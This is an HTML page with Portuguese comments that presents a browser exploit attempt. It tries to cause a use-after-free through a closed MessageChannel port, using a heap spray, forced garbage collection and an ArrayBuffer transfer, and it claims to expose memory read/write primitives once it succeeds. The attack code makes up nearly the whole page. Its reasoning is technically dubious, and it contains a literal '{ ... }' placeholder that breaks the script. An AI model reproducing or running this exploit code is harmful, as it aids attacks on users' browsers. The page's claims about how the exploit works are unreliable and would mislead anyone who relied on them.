<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>sto26 - UAF via MessageChannel (nova tentativa)</title>
    <style>
        body { background: #0a0c12; color: #ccc; font-family: monospace; padding: 20px; }
        .log { background: #03050a; height: 60vh; overflow-y: auto; padding: 10px; border-radius: 12px; font-size: 12px; }
        button { background: #2f5b8c; border: none; padding: 8px 16px; border-radius: 40px; color: white; margin: 5px; cursor: pointer; }
    </style>
</head>
<body>
<h1>🧬 UAF via MessageChannel + Heap Spray</h1>
<button id="runBtn">▶ Executar (tenta obter buffer corrompido)</button>
<div class="log" id="log"></div>
<script>
    const logDiv = document.getElementById('log');
    function log(msg, type='info') {
        const line = document.createElement('div');
        line.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
        if(type==='success') line.style.color = '#8bcb8b';
        else if(type==='error') line.style.color = '#ff8a7a';
        else line.style.color = '#ccc';
        logDiv.appendChild(line);
        logDiv.scrollTop = logDiv.scrollHeight;
        console.log(msg);
    }

    async function attemptUAF() {
        log("Criando UAF via MessageChannel...");
        // 1. Cria MessageChannel e fecha uma das portas
        let { port1, port2 } = new MessageChannel();
        port1.close();   // fecha, mas mantemos referência
        // 2. Heap spray com ArrayBuffers para tentar ocupar a região liberada
        let spray = [];
        for (let i = 0; i < 20000; i++) {
            let ab = new ArrayBuffer(0x200);
            let dv = new DataView(ab);
            dv.setUint32(0, i, true);  // marca com índice
            spray.push(ab);
        }
        // Forçar GC
        for (let i = 0; i < 10; i++) new ArrayBuffer(0x800000);
        if (window.gc) window.gc();
        // Tentar type confusion: acessar propriedade que deveria ser de MessagePort,
        // mas agora (se o spray funcionou) pode ler o ArrayBuffer
        try {
            // Se a type confusion funcionou, 'port1.onmessage' lerá o primeiro byte do buffer
            let leaked = port1.onmessage;
            if (typeof leaked === 'number') {
                log(`[+] Type confusion! Valor lido: ${leaked} (possivelmente índice do spray)`, 'success');
                // O buffer corrompido é o ArrayBuffer que ocupou o lugar
                // Precisamos encontrar qual buffer foi (índice)
                let idx = leaked;
                if (idx < spray.length) {
                    let corruptedBuffer = spray[idx];
                    window.exploitAB = corruptedBuffer;
                    log(`[+] Buffer corrompido obtido! Tamanho: ${corruptedBuffer.byteLength} bytes`, 'success');
                    // Utilitários
                    const dv = new DataView(corruptedBuffer);
                    window.readBuffer = (addr) => dv.getUint8(addr);
                    window.writeBuffer = (addr, val) => dv.setUint8(addr, val);
                    window.dumpBuffer = (len=64) => {
                        let s='';
                        for(let i=0;i<len;i++){ if(i%16===0) s+='\n'+i.toString(16).padStart(4,'0')+': '; s+=dv.getUint8(i).toString(16).padStart(2,'0')+' '; }
                        log(`Buffer dump:${s}`,'info');
                    };
                    return true;
                }
            }
        } catch(e) {}
        log("Type confusion falhou. Tentando nova estratégia: enviar ArrayBuffer via postMessage na porta fechada...");
        // Estratégia alternativa: enviar um ArrayBuffer transferível após close
        try {
            let ab = new ArrayBuffer(0x100);
            let view = new Uint8Array(ab);
            view[0] = 0x42;
            port1.postMessage(ab, [ab]);  // transfere o buffer
            // Após transfer, o buffer original deveria ser destacado, mas o UAF pode manter referência
            // Tentar ler o buffer (pode ainda estar acessível)
            if (view[0] === 0x42) {
                log("[+] UAF confirmado: ArrayBuffer ainda acessível após transfer!", 'success');
                window.exploitAB = ab;
                // Agora temos um buffer (pequeno) corrompido
                const dv = new DataView(ab);
                window.readBuffer = (addr) => dv.getUint8(addr);
                window.writeBuffer = (addr, val) => dv.setUint8(addr, val);
                window.dumpBuffer = (len=64) => { ... };
                return true;
            }
        } catch(e) {}
        return false;
    }

    async function run() {
        log("Iniciando tentativas (pode levar alguns segundos)...");
        for (let i=0; i<30; i++) {
            log(`Tentativa ${i+1}...`);
            let success = await attemptUAF();
            if (success) {
                log("✅ Exploit bem-sucedido! Use window.readBuffer, writeBuffer, dumpBuffer.", 'success');
                return;
            }
            await new Promise(r => setTimeout(r, 200));
        }
        log("❌ Falha após 30 tentativas. Recarregue a página e tente novamente.", 'error');
    }

    document.getElementById('runBtn').onclick = () => run();
</script>
</body>
</html>
